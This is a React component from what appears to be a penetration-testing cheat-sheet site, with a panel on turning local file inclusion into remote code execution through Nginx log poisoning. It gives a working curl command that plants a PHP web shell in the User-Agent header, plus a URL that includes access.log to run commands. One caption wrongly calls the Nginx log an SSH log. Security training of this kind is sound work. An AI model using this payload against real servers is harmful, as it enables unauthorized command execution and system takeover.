import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const LFI_2_RCE_Nginx_Logs = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Typography>
              The Nginx web server contains various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs. By default, Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows.
              </Typography>
            <Box pt={5}></Box>
            <Typography>
            Poison the User-Agent in access logs:
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'curl http://<SERVER_IP>:<PORT>/ -A "<?php system(\$_GET[\'cmd\']);?>"'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography>
            Then include the SSH log files inside the Web Application.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'http://example.com/index.php?page=/var/log/nginx/access.log&cmd=id'}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
              <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#rce-via-ssh" target="_blank">
                  <TreeItem nodeId="2" label="PayloadAllTheThings" />
                </a>
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default LFI_2_RCE_Nginx_Logs;
  